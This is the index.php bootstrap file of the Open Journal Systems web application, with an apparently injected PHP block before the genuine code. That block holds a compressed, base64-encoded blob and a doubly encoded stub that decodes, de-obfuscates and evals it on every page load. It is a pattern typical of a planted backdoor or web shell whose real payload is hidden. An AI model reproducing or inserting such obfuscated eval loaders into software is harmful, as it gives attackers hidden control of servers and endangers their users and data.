<?php
$SISTEMIT_COM_ENC = "bVJNa8JAEL0L/ohCIRGs0kOhVDy0ILaXUjT1UkrAgDkYg+SkFH+M5JYlhz3kFPaS98f6JhoTPxjIbubj7Zs3024tEIceFBLkYZHx0O4cOZTdKbK/dqvIDnaPGBpp5ML4SEOoIhvS605Hk9lo8mO9O86X+80/93U8+nSs30GjtgSELktgoghma1tjOnM/QFpGrW6RWQ5S/vuMr95OzjmS0K9zTmUPU5JVPGekhWSBxIM5NnKR+RFCr5FWbToSCKxOg2J9WyCPkMJ42BeZXVMntq5aOZemMnJgBVVSpLNmnravVOs2IO6GQ3nOBJJyG7IyYaQQRzIhosdIB9fJu9q1u9VZA6R6lShMbbeO1BvDv5j+irWaJm2UY6TcVNb1BdP1KKqMQj7atrDnqdbQL/2+CE+1l1sW70Va1ROFSpH7ARIf5vHp2Re986hfhgx5kJ5Zzrkr9MTcB163MD2oDdegOTiZKnEvKJ4lbGRPDp3+Aw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="EL0L/ohCIRGs0kOhVDy0ILaXUjT1UkrAgDkYg+SkFH+M5JYlhz3kFPaS98f6JhoTPxjIbubj7Zs3024tEIceFBLkYZHx0O4cOZTdKbK/dqvIDnaPGBpp5ML4SEOoIhvS605Hk9lo8mO9O86X+80/93U8+nSs30GjtgSELktgoghma1tjOnM/QFpGrW6RWQ5S/vuMr95O";
?>
<?php

/**
 * @mainpage OJS API Reference
 *
 * Welcome to the OJS API Reference. This resource contains documentation
 * generated automatically from the OJS source code.
 *
 * The design of Open %Journal Systems 2.x is heavily structured for
 * maintainability, flexibility and robustness. Those familiar with Sun's
 * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
 * will note similarities.
 *
 * As in a MVC structure, data storage and representation, user interface
 * presentation, and control are separated into different layers. The major
 * categories, roughly ordered from "front-end" to "back-end," follow:
 * - Smarty templates, which are responsible for assembling HTML pages to
 *   display to users;
 * - Page classes, which receive requests from users' web browsers, delegate
 *   any required processing to various other classes, and call up the
 *   appropriate Smarty template to generate a response;
 * - Controllers, which implement reusable pieces of content e.g. for AJAX
 *   subrequests.
 * - Action classes, which are used by the Page classes to perform non-trivial
 *   processing of user requests;
 * - Model classes, which implement PHP objects representing the system's
 *   various entities, such as Users, Articles, and Journals;
 * - Data Access Objects (DAOs), which generally provide (amongst others)
 *   update, create, and delete functions for their associated Model classes,
 *   are responsible for all database interaction;
 * - Support classes, which provide core functionalities, miscellaneous common;
 *
 * Additionally, many of the concerns shared by multiple PKP applications are
 * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
 * subdirectory. The same conventions listed above apply to lib/pkp as well.
 *
 * As the system makes use of inheritance and has consistent class naming
 * conventions, it is generally easy to tell what category a particular class
 * falls into.
 *
 * For example, a Data Access Object class always inherits from the DAO class,
 * has a Class name of the form [Something]%DAO, and has a filename of the form
 * [Something]%DAO.inc.php.
 *
 * To learn more about developing OJS, there are several additional resources
 * that may be useful:
 * - The docs/README.md document
 * - The PKP support forum at http://forum.pkp.sfu.ca
 * - Documentation available at http://pkp.sfu.ca/ojs_documentation
 *
 * @file ojs/index.php
 *
 * Copyright (c) 2014-2020 Simon Fraser University
 * Copyright (c) 2003-2020 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
$application = require('./lib/pkp/includes/bootstrap.inc.php');

// Serve the request
$application->execute();


